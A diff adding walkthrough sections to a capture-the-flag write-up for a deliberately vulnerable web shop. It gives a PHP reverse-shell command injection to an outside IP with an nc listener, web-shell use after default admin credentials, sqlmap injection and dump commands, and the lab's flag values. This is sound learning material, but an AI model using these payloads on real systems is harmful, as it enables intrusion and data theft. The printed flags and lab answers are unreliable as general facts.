@@ -402,3 +402,202 @@ echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d
 
 ### Task 11 (RCE)
 
+At enumeration phase with `nmap` we found there is admin panel on port 8000, http://nahamstore.thm:8000/admin.
+On this page we can enter as `admin/admin`, and this is a default credentials vulnerability.
+
+On the admin page we can `Edit Campaign Details`, and there is a box when we can write code on it. So let's try to get a shell.
+
+In this case i use https://github.com/flozz/p0wny-shell/blob/master/shell.php when we can gain a shell on the browser.
+
+After updating the code and enter the poison product, we successfully gain a shell.
+
+```shell
+cat /flag.txt
+```
+
+```text
+{b42d2f1ff39874d56132537be62cf9e3}
+```
+
+> First RCE flag
+> 
+> {b42d2f1ff39874d56132537be62cf9e3}
+
+Now let's search for the next one, our first target here is the `pdf-generator` (When we order something) because the site is connect to the server to generate a PDF.
+
+So after intercepting the request we found two parameters `what=` and `id=`. After some attempts we found that the parameter `id=` is not well filtered. 
+
+To gain access we try inject it with a reverse shell: 
+`id=1$(php+-r+'$sock%3dfsockopen("192.168.130.58",7777)%3bexec("sh+<%263+>%263+2>%263")%3b')`
+
+We have to listen on the specified port using `nc -lnvp 7777`. Then sending the request, and we will gain access successfully.
+
+```shell
+cat /flag.txt
+```
+
+```text
+{93125e2a845a38c3e1531f72c250e676}
+```
+
+> Second RCE flag
+> 
+> {93125e2a845a38c3e1531f72c250e676}
+
+### Task 3
+
+Now after gaining access to server on the previous task, we can read the servers hosts file and see if we can find some subdomains that we can't find from outside.
+
+On the severs shell we take previously.
+
+```shell
+cat /etc/hosts
+
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.6      2431fe29a4b0
+127.0.0.1       nahamstore.thm
+127.0.0.1       www.nahamstore.thm
+172.17.0.1      stock.nahamstore.thm
+172.17.0.1      marketing.nahamstore.thm
+172.17.0.1      shop.nahamstore.thm
+172.17.0.1      nahamstore-2020.nahamstore.thm
+172.17.0.1      nahamstore-2020-dev.nahamstore.thm
+10.131.104.72   internal-api.nahamstore.thm
+```
+
+This is it there is two new subdomains `nahamstore-2020.nahamstore.thm` and `nahamstore-2020-dev.nahamstore.thm`.
+
+After adding them to our `/etc/hosts` file, and enumerate them if there is any hiding directories and parameters using `gobuster and arjun`.
+We found: http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2
+
+```json
+id:	2
+name:	"Jimmy Jones"
+email:	"jd.jones1997@yahoo.com"
+tel:	"501-392-5473"
+ssn:	"521-61-6392"
+```
+
+> Jimmy Jones SSN
+> 
+> 521-61-6392
+
+### Task 12 (SQL Injection)
+
+On the `/products` directory if we enter a single quote (') in the `id parameter`, we get this:
+`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1`
+
+We can understand that there is a misconfiguration on the SQL data base which can lead to an SQLi.
+
+So let's use `sqlmap` to see.
+
+```shell
+sqlmap -u "http://nahamstore.thm/product?id=1" --batch
+```
+
+That's it there is a multiple vulnerabilities on the id parameter.
+
+```shell
+sqlmap -u "http://nahamstore.thm/product?id=1" --batch --tables
+```
+
+```text
+Database: nahamstore
+[2 tables]
++---------------------------------------+
+| product                               |
+| sqli_one                              |
++---------------------------------------+
+```
+
+```shell
+sqlmap -u "http://nahamstore.thm/product?id=1" --batch -D nahamstore --dump
+```
+
+```text
+Database: nahamstore
+Table: sqli_one
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {d890234e20be48ff96a2f9caab0de55c} |
++----+------------------------------------+
+```
+
+> Flag 1
+> 
+> {d890234e20be48ff96a2f9caab0de55c}
+
+Now in the `blind SQLi` we have to try enter to any page in the web while seeing the `HTTP history` on Burp for suspect requests. After some attempts we found `POST /returns`.
+
+We have to copy the request and send it to `sqlmap` to see if there is any SQLi vulnerability.
+
+```shell
+nano req.txt
+
+
+POST /returns HTTP/1.1
+Host: nahamstore.thm
+Content-Length: 344
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAqrfxdR9dAOyjKFQ
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: http://nahamstore.thm
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://nahamstore.thm/returns
+Accept-Encoding: gzip, deflate, br
+Cookie: session=b8f452811bb6cdebda06db608b2e6921; token=1cf7514f149932e2aca092e1c3eb7632
+Connection: keep-alive
+
+------WebKitFormBoundaryAqrfxdR9dAOyjKFQ
+Content-Disposition: form-data; name="order_number"
+
+1
+------WebKitFormBoundaryAqrfxdR9dAOyjKFQ
+Content-Disposition: form-data; name="return_reason"
+
+3
+------WebKitFormBoundaryAqrfxdR9dAOyjKFQ
+Content-Disposition: form-data; name="return_info"
+
+q
+------WebKitFormBoundaryAqrfxdR9dAOyjKFQ--
+```
+
+```shell
+sqlmap -r req.txt --batch
+```
+
+And successfully we found that it is vulnerable.
+
+```shell
+sqlmap -r req.txt --batch --tables
+```
+
+```shell
+sqlmap -r req.txt --batch -D nahamstore -T sqli_two --dump
+```
+
+```text
+Database: nahamstore
+Table: sqli_two
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {212ec3b036925a38b7167cf9f0243015} |
++----+------------------------------------+
+```
+
+> Flag 2 ( blind )
+> 
+> {212ec3b036925a38b7167cf9f0243015}
+
